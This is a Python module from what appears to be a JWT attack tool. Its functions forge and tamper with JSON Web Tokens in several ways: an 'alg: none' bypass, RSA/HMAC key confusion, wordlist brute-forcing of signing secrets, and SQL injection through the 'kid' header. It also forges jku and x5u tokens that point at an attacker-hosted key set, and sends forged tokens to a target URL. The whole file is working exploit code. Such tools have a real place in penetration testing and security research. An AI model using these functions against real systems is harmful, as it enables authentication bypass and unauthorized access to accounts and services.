"""
All methods needed to try vulnerabilities on jwt
"""

import base64
import json
from typing import Any, cast

import click
import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey
from OpenSSL import crypto

from myjwt.Exception import InvalidJWT
from myjwt.modify_jwt import change_alg, signature
from myjwt.utils import HEADER, PAYLOAD, SIGNATURE, create_crt, encode_jwt, is_valid_jwt, jwt_to_json


def none_vulnerability(jwt: str) -> str:
    """
    Check none Vulnerability.

    Parameters
    ----------
    jwt: str
        your jwt string.

    Returns
    -------
    str
        your new jwt.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = change_alg(jwt_to_json(jwt), "none")
    return encode_jwt(jwt_json) + "."


def confusion_rsa_hmac(jwt: str, filename: str) -> str:
    """
    Check rsa/hmac confusion.

    Parameters
    ----------
    jwt: str
        your jwt string.
    filename: str
        path file of your public key.

    Returns
    -------
    str
        your new jwt.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = change_alg(jwt_to_json(jwt), "HS256")
    return signature(jwt_json, open(filename).read())


def bruteforce_wordlist(jwt: str, filename: str) -> str:
    """
    Crack your jwt with wordlist.

    Parameters
    ----------
    jwt: str
        your jwt string.
    filename: str
        path file of your wordlist txt file.

    Returns
    -------
    str
        your new jwt or "" if the valid key is not found.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    with open(filename, encoding="latin-1") as file:
        all_password = [line.rstrip() for line in file]
    file.close()
    for password in all_password:
        new_jwt = signature(jwt_json, password)
        new_signature = new_jwt.split(".")[2]
        if new_signature == jwt.split(".")[2]:
            return password
    return ""


def inject_sql_kid(jwt: str, injection: str) -> str:
    """
    Inject sql to your jwt.

    Parameters
    ----------
    jwt: str
        your jwt.
    injection: str
        your kid injection.

    Returns
    -------
    str
        your new jwt.

    Raises
    -------
    InvalidJWT
        if your jwt is not valid.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    jwt_json[HEADER]["kid"] = injection
    return signature(jwt_json, "")


def send_jwt_to_url(
    url: str,
    method: str,
    data: dict[str, Any],
    cookies: dict[str, Any],
    jwt: str,
) -> requests.Response:
    """

    Parameters
    ----------
    url: str
        your url.
    method: str
        method (GET, POST, etc.....).
    data: Dict
        json to send.
    cookies: Dict
        cookies to send.
    jwt: str
        your jwt.
    Returns
    -------
    requests.Response
        Response
    """
    if method == "POST":
        return requests.post(
            url,
            json=data,
            headers={"Authorization": "Bearer " + jwt},
            cookies=cookies,
        )

    return requests.request(method=method, url=url, json=data, cookies=cookies)


def print_decoded(jwt: str) -> None:
    """
    Print your jwt.

    Parameters
    ----------
    jwt: str
        your jwt.

    Returns
    -------
    None
        Print your jwt.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)
    click.echo("Header: ")
    for key in jwt_json[HEADER].keys():
        click.echo(
            str(key) + " = " + (str(jwt_json[HEADER][key]) if jwt_json[HEADER][key] is not None else "null"),
        )

    click.echo("")
    click.echo("Payload: ")
    for key in jwt_json[PAYLOAD].keys():
        click.echo(
            str(key) + " = " + (str(jwt_json[PAYLOAD][key]) if jwt_json[PAYLOAD][key] is not None else "null"),
        )
    click.echo("")
    click.echo("Signature: \n" + json.dumps(jwt_json[SIGNATURE]))


def jku_vulnerability(jwt: str = "", url: str = "", file: str | None = None, pem: str | None = None) -> str:
    """
    Check jku Vulnerability.

    Parameters
    ----------
    jwt: str
        your jwt.
    url: str
        your url.
    file: str
        your output json file name
    pem: str
       pem file name

    Returns
    -------
    str
        your new jwt.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwt_json = jwt_to_json(jwt)

    if "jku" not in jwt_json[HEADER]:
        raise InvalidJWT("Invalid JWT format JKU missing")

    if file is None:
        file = "jwk-python.json"
    jwks = requests.get(jwt_json[HEADER]["jku"]).json()

    jwt_json[HEADER]["alg"] = "RS256"
    if ".json" not in file:
        file += ".json"
    if not url.endswith("/"):
        url += "/"
    jwt_json[HEADER]["jku"] = f"{url}{file}"
    if pem is None:
        key = crypto.PKey()
        key.generate_key(type=crypto.TYPE_RSA, bits=2048)
    else:
        key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())
    priv = cast(RSAPrivateKey, key.to_cryptography_key())
    pub = priv.public_key()

    e = pub.public_numbers().e
    n = pub.public_numbers().n

    jwks["keys"][0]["e"] = (
        base64.urlsafe_b64encode(
            e.to_bytes(e.bit_length() // 8 + 1, byteorder="big"),
        )
        .decode("UTF-8")
        .rstrip("=")
    )
    jwks["keys"][0]["n"] = (
        base64.urlsafe_b64encode(
            n.to_bytes(n.bit_length() // 8 + 1, byteorder="big"),
        )
        .decode("UTF-8")
        .rstrip("=")
    )

    f = open(file, "w")
    f.write(json.dumps(jwks))
    f.close()

    s = encode_jwt(jwt_json)

    sign = priv.sign(
        bytes(s, encoding="UTF-8"),
        algorithm=hashes.SHA256(),
        padding=padding.PKCS1v15(),
    )

    return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")


def x5u_vulnerability(
    jwt: str = "", url: str = "", crt: str | None = None, pem: str | None = None, file: str | None = None
) -> str:
    """
    Check jku Vulnerability.

    Parameters
    ----------
    jwt: str
        your jwt.
    url: str
        your url.
    crt: str
        crt path file
    pem: str
       pem file name
    file: str
        jwks file name

    Returns
    -------
    str
        your new jwt.
    """
    if not is_valid_jwt(jwt):
        raise InvalidJWT("Invalid JWT format")
    if file is None:
        file = "jwks_with_x5c.json"

    jwt_json = jwt_to_json(jwt)
    if "x5u" not in jwt_json[HEADER]:
        raise InvalidJWT("Invalid JWT format JKU missing")
    if crt is None or pem is None:
        crt, pem = create_crt()

    with open(crt) as f:
        content = f.read()
        f.close()

    x5u = requests.get(jwt_json[HEADER]["x5u"]).json()
    x5u["keys"][0]["x5c"] = (
        content.replace("-----END CERTIFICATE-----", "").replace("-----BEGIN CERTIFICATE-----", "").replace("\n", "")
    )
    if ".json" not in file:
        file += ".json"
    if not url.endswith("/"):
        url += "/"
    jwt_json[HEADER]["x5u"] = f"{url}{file}"

    f = open(file, "w")
    f.write(json.dumps(x5u))
    f.close()

    s = encode_jwt(jwt_json)
    key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())

    priv = cast(RSAPrivateKey, key.to_cryptography_key())
    sign = priv.sign(
        bytes(s, encoding="UTF-8"),
        algorithm=hashes.SHA256(),
        padding=padding.PKCS1v15(),
    )

    return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")
